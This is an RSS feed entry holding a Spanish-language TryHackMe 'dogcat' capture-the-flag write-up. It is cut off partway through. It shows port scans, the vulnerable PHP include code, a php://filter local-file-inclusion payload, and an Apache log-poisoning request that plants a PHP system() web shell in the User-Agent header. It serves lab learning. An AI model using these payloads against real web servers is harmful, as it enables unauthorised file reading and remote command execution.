<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" 
  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
  xmlns:dc="http://purl.org/dc/elements/1.1/" 
  xmlns:atom="http://www.w3.org/2005/Atom" 
  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
  xmlns:media="http://search.yahoo.com/mrss/">
  <channel>
    <title>lfi poisoning on sckull</title>
    <link>https://sckull.github.io/tags/lfi-poisoning/</link>
    <description>Recent content in lfi poisoning on sckull</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>es</language>
    <copyright>©{year}, All Rights Reserved</copyright>
    <lastBuildDate>Sat, 18 Apr 2020 00:00:00 +0000</lastBuildDate>
    <sy:updatePeriod>daily</sy:updatePeriod>
    <sy:updateFrequency>daily</sy:updateFrequency>
    
        <atom:link href="https://sckull.github.io/tags/lfi-poisoning/index.xml" rel="self" type="application/rss+xml" />
    
    
    

      
      <item>
        <title>TryHackMe - DogCat</title>
        <link>https://sckull.github.io/posts/dogcat/</link>
        <pubDate>Sat, 18 Apr 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 18 Apr 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/dogcat/</guid>
        <description>DogCat es una maquina de TryHackMe, explotando la vulnerabilidad LFI con wrappers de PHP obtuvimos la primera flag.</description>
        <content:encoded>



  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/dogcat/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;p&gt;DogCat es una maquina de TryHackMe, explotando la vulnerabilidad LFI con wrappers de PHP obtuvimos la primera flag. Realizando Log Poisoning obtuvimos una shell. Escalamos privilegios utilizando ENV y Sudo en contenedor de Docker. Un script ejecutado por un CronJob del Host permitio escalar privilegios.&lt;/p&gt;
&lt;h1 id=&#34;room&#34;&gt;Room&lt;/h1&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;strong&gt;Titulo&lt;/strong&gt;&lt;/th&gt;
&lt;th align=&#34;left&#34;&gt;&lt;a href=&#34;https://tryhackme.com/room/dogcat&#34;&gt;dogcat&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,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&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Descripción&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;I made a website where you can look at pictures of dogs and/or cats! Exploit a PHP application via LFI and break out of a docker container.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;435&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_thm&#34; style=&#34;margin-bottom: 5px;&#34;&gt; &lt;a href=&#34;https://tryhackme.com/p/jammy&#34;&gt;jammy&lt;/a&gt; &lt;img src=&#34;https://tryhackme-badges.s3.amazonaws.com/jammy.png&#34; class=&#34;user_maker_thm&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;nmap&#34;&gt;NMAP&lt;/h1&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto http (445) y el puerto ssh (22) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Fri Apr 17 20:42:19 2020 as: nmap -T5 -sV -sC -p- -o nmap_scan dogcat.thm&lt;/span&gt;
Warning: dogcat.thm giving up on port because retransmission cap hit &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; dogcat.thm
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.15s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65497&lt;/span&gt; closed ports, &lt;span class=&#34;m&#34;&gt;36&lt;/span&gt; filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.38 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Debian&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.38 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Debian&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: dogcat
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Fri Apr 17 20:52:58 2020 -- 1 IP address (1 host up) scanned in 639.73 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;gobuster-&#34;&gt;GOBUSTER&lt;/h2&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/tools/Kadimus# gobuster dir -u http://dogcat.thm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t &lt;span class=&#34;m&#34;&gt;45&lt;/span&gt; -x php,html,txt
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/cat.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/flag.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/cats &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/dogs &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/dog.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;http-&#34;&gt;HTTP&lt;/h1&gt;
&lt;p&gt;Encontramos una pagina sencilla en el puerto 80, que al darle click a la opcion de perro (dog) nos muestra una imagen.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2001.07.10.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Vemos que en la url le pasa por parametro la palabra dog. Dentro del escaneo de GOBUSTER vimos que existe un archivo cat y dog con extension en php, al ver el codigo fuente de ambas paginas y al recargar por repetidas ocaciones la imagen que genera junto al codigo html es distinta.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2001.10.03.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Por lo que cada vez que se selecciona la opcion de dog o cat, nos muéstra distintas imagenes.&lt;/p&gt;
&lt;h1 id=&#34;lfi---cat-or-dog&#34;&gt;LFI - CAT OR DOG&lt;/h1&gt;
&lt;p&gt;Intentamos utilizar LFI basico (/etc/passwd, /var/log/apache2/access.log, etc) pero no logramos leer ninguno de los archivos ya que la pagina nos mostraba el mensaje &lt;code&gt;Sorry, only dogs or cats are allowed.&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2001.12.36.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Lo curioso de este reto es que, al pasarle la palabra cat dentro de una peticion de un archivo o lo que fuera, nos mostraba el mensaje &lt;code&gt;Here you go!&lt;/code&gt; y un error de la funcion &lt;code&gt;include()&lt;/code&gt;. Desde aqui tiene un poco de sentido el mensaje de error anterior (&lt;code&gt;Sorry, only dogs or cats are allowed.&lt;/code&gt;) podemos utilizar tanto dog o cat dentro de las peticiones para que sean aceptadas.&lt;/p&gt;
&lt;p&gt;Utilizamos &lt;code&gt;php://filter/convert.base64-encode/dog/resource=ARCHIVO&lt;/code&gt; para leer archivos, en este caso leemos el archivo index.php que es el que utiliza &lt;code&gt;?view=&lt;/code&gt;, logramos obtener el archivo en base64.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2001.25.59.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Logramos obtener el codigo fuente de index.php, logramos ver que hay una funcion que verifica si existe cat o dog dentro de la peticion, tambien vemos que podemos enviarle como parametro una extension de lo contrario la tomara como &lt;code&gt;.php&lt;/code&gt;.&lt;/p&gt;
&lt;details&gt;
  &lt;summary&gt;**ALERTA DE SPOILER** `SPOILER` `SPOILER` `SPOILER`&lt;/summary&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;  &lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;containsStr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$substr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
          &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;strpos&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$substr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!==&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
      &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
      &lt;span class=&#34;nv&#34;&gt;$ext&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ext&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;?&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ext&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;view&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
          &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;containsStr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;view&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;dog&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;containsStr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;view&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;cat&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
              &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Here you go!&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
              &lt;span class=&#34;k&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;view&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$ext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
          &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
          &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Sorry, only dogs or cats are allowed.&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
          &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
      &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
  &lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/details&gt;
&lt;p&gt;Leemos el archivo flag.php y logramos leer nuestra primera flag.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2001.30.02.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;rce---apache-log-poisoning&#34;&gt;RCE - Apache Log Poisoning&lt;/h1&gt;
&lt;p&gt;Utilizamos el User-Agent para poder ejecutar nuestro codigo php el que tendra como objetivo obtener y ejecutar un comando que le pasemos. Utilizamos &lt;code&gt;php://filter/dog/resource=../../../../var/log/apache2/access.log&amp;amp;ext=&lt;/code&gt; para leer el archivo log, además de esto agregamos el comando que deseamos ejecutar en la maquina &lt;code&gt;&amp;amp;cmd=whoami&lt;/code&gt;, por lo que luciría de la siguiente forma.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.hackingarticles.in/apache-log-poisoning-through-lfi/&#34;&gt;&lt;strong&gt;Apache Log Poisoning&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;GET /?view&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;php://filter/dog/resource&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;../../../../var/log/apache2/access.log&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;ext&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;cmd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;whoami HTTP/1.1
Host: dogcat.thm
User-Agent:Mozilla/5.0 &amp;lt;?php system&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;cmd&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; ?&amp;gt; Gecko/20100101 Firefox/68.0 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
